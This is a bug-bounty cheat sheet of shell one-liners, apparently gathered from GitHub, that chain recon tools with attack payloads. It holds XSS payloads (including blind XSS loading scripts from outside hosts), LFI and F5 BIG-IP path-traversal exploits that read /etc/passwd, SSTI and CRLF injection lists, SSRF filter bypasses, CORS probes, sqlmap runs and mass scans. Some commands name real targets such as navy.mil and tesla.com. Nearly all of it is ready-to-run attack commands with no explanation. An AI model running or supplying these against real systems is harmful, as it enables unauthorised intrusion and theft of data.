https://github.com/mohammedshine
https://github.com/onceupon/Bash-Oneliner
https://github.com/stephenturner/oneliners
https://github.com/stephenturner/oneliners
https://github.com/XalfiE/Bug-Bounty-Oneliners
https://github.com/NagliNagli/OneLiners
https://github.com/jmreicha/oneliners
https://github.com/jmreicha/oneliners
https://github.com/twseptian/oneliner-bugbounty

FIND BIG-IP
	cat companyNames.txt | sed -e 's/.com//g' -e 's/.net//g' -e 's/.org//g' -e 's/.info//g' -e 's/.ru//g'|while read url;do test=$(shodan search org:$url http.title:"BIG-IP&reg;-Redirect" | awk '{print $1,$2}');echo -e "\033[32m$url""\033[34m\n$test";done
FIND JS-FILES
	assetfinder site.com | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)'|while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" |sed -e 's, 'var','"$url"?',g' -e 's/ //g'|grep -v '.js'|sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars";done
LFI
```
gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'XS
```
XSS
```
 gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt
------------------
gospider -s "https://www.target.com/" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
-------------------
gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
----------------------
hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b https://your.xss.ht
-----------------------
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
---------------------
subfinder -d target.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameter
-------------------------
subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"
-------------------
echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
-----------------
echo "http://testphp.vulnweb.com/" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf xss | anew
---------------------
waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
----------------------
gospider -a -s https://site.com -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
----------------
httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo "(http|https)://[^/"].* | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>"
```

SHODAN SEARCH
```
http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done

```
OPEN-REDIRECT
```
Open Redirect : export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```
XSS
```
waybackurls target.com | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done

```
SSTI
```
aybackurls target.com | grep '=' | qsreplace "bounty{{5*5}}" | httpx -match-regex 'bounty25' -threads 300 -http-proxy http://127.0.0.1:8080/ 
```
SUBDOMAIN_TAKEOVER
```
subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/fingerprints.json -v 3 >> takeover ;
-----------------
subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ;
```
EXTRACT_SUBDOMAINS FROM IP RANGE
```
nmap IP_range | grep "domain" | awk '{print $5}'
```
APK-JUICY INFO
```
apktool d apk;grep -EHim "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder
```
GATHER_URLS SEND TO BURP
```
cat hosts | sed 's/https\?:\/\///' | gau > urls.txt
cat urls.txt | grep -P "\w+\.js(\?|$)" | sort -u > jsurls.txt
ffuf -mc 200 -w jsurls.txt:HFUZZ -u HFUZZ -replay-proxy http:127.0.0.1:8080
```

CONTENT_DISCOVERY
```
ffufr()
{
ffuf -c -w /SecLists/Discovery/Web-Content/$1 -u http://$2/FUZZ -recursion
}

usage: "ffufr common.txt tesla.com" 

1.Download SecLists wordlists - "https://github.com/danielmiessler/SecLists"
2.Install ffuf - "https://github.com/ffuf/ffuf"
3.Go to home directory (cd)
4.nano/vim .bashrc
5.Configure the function above to your Seclists Web-Content path.
6.save the .bashrc
7.run source .bashrc to update the changes made.
8. run "ffufr WORDLISTNAME.txt, DOMAIN.com"
```

SSTI
```
for word in $(cat $1);
do
dir=/home/recon/$word/
cat $dir/subdomains.txt| gau -subs | grep = | qsreplace "sstitest{{7*7}}" > $dir/wordlist.txt
ffuf -u FUZZ -w $dir/wordlist.txt -mr "sstitest49" -t 300 -o $dir/ssti.txt;
done

```
FIND /.git/HEAD
```
curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
---
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
SQL INJECTION
```
findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
```
CORS MISCONFIGARATION
```
site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```
NUCLEI SCAN TO BUGBOUNTY TARGETS
```
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | httpx -silent | xargs -n 1 gospider -o output -s ; cat output/* | egrep -o 'https?://[^ ]+' | nuclei -t ~/nuclei-templates/ -o result.txt
----------------------------------
amass enum -passive -norecursive -d https://target.com -o domain ; httpx -l domain -silent -threads 10 | nuclei -t nuclei-templates -o result -timeout 30
```
JAELES SCAN TO BUGBOUNTY TARGETS
```
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
----------------------
curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | httpx -silent -threads 300 | anew | rush -j 10 'jaeles scan -s /jaeles-signatures/ -u {}'
```
DUMP BUGCROWD PROGRAMS
```
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

CRLF
```
/%%0a0aSet-Cookie:crlf=injection 
/%0aSet-Cookie:crlf=injection 
/%Od%OaSet-Cookie:crlf=injection 
/%OdSet-Cookie:crlf=injection 
/%23%OaSet-Cookie:crlf=injection 
/%23%Od%OaSet-Cookie:crlf=injection 
/%23%OdSet-Cookie:crlf=injection 
/%25%30%61Set-Cookie:crlf=injection 
/%25%30aSet-Cookie:crlf=injection 
/%250aSet-Cookie:crlf=injection 
/%25250aSet-Cookie:crlf=injection 
/%2e%2e%2f%Od%OaSet-Cookie:crlf=injection 
/%2f%2e%2e%Od%OaSet-Cookie:crlf=injection 
/%2F..%Od%OaSet-Cookie:crlf=injection 
/%3f%Od%OaSet-Cookie:crlf=injection 
/%3f%OdSet-Cookie:crlf=injection 
/%u000aSet-Cookie:crlf=injection


input='CRLF-one-liner/subdomains.txt';while IFS= read -r targets; do cat CRLF-one-liner/crlf_payloads.txt|xargs -I % sh -c "curl -vs --max-time 9 $targets/% 2>&1 |grep -q '< Set-Cookie: ?crlf'&& echo $targets '[+] is vulnerable with payload: '%>>crlf_results.txt||echo '[-] Not vulnerable: '$targets";done<$input

```


SSRF BYPASS
```
# SSRF 
- http://127.1/
- http://0000::1:80/
- http://[::]:80/
- http://2130706433/
- http://whitelisted@127.0.0.1
- http://0x7f000001/
- http://017700000001
- http://0177.00.00.01
- http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
- http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
- http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/
- http://②⑧⑤②⓪③⑨①⑥⑥:80/
- http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/ 
- http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥:80/
- http://0xd8.0x3a.0xd6.0xe3
- http://0xd83ad6e3
- http://0xd8.0x3ad6e3
- http://0xd8.0x3a.0xd6e3
- http://0330.072.0326.0343
- http://000330.0000072.0000326.00000343
- http://033016553343
- http://3627734755
- http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
- http://216.0x3a.00000000326.0xe3

# Sites Bypass 
- http://newyork.localtest.me
- http://mysite.localtest.me
- http://redirecttest.localtest.me
- http://sub1.sub2.sub3.localtest.me
- http://bugbounty.dod.network
- http://spoofed.burpcollaborator.net

```
DOWN_LINKS
https://github.com/KingOfBugbounty/KingOfBugBountyTips/blob/master/downlink
AMASS TO VULN NUCLEISCAN
```
amass enum -passive -norecursive -d disa.mil -o domain ; httpx -l domain -silent -threads 10 | nuclei -t PATH -o result -timeout 30 
```
LIST OF IPS AND DOMAINS EXTRACT
```
amass enum -src -ip -active -brute -d navy.mil -o domain ; cat domain | cut -d']' -f 2 | awk '{print $1}' | sort -u > hosts-amass.txt ; cat domain | cut -d']' -f2 | awk '{print $2}' | tr ',' '\n' | sort -u > ips-amass.txt ; curl -s "https://crt.sh/?q=%.navy.mil&output=json" | jq '.[].name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u > hosts-crtsh.txt ; sed 's/$/.navy.mil/' dns-Jhaddix.txt_cleaned > hosts-wordlist.txt ; cat hosts-amass.txt hosts-crtsh.txt hosts-wordlist.txt | sort -u > hosts-all.txt
```
SUBDOMAINS
```
xargs -a army1 -I@ sh -c 'echo @' | dnsgen - | httpx -silent -threads 10000 | anew newdomain  ////more domains
----------------
sub domains/screats
cat subdomsains.txt | httpx --silent | jsubfinder -s
----------------------
assetfinder to masscan
assetfinder DOMAIN --subs-only | anew | massdns -r lists/resolvers.txt -t A -o S -w result.txt ; cat result.txt | sed 's/A.*//; s/CN.*// ; s/\..$//' | httpx -silent
----------------
Directory bruteforce 
cat hosts | xargs -I@ sh -c 'python3 dirsearch.py -r -b -w path -u @ -i 200, 403, 401, 302 -e php,html,json,aspx,sql,asp,js'
-----------------
CORS MISCONFIGURATION
assetfinder fitbit.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin:evil.com" {} |  [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n\033[0;32m[VUL TO CORS] - {}\e[m"' 2>/dev/null"
--------------

```







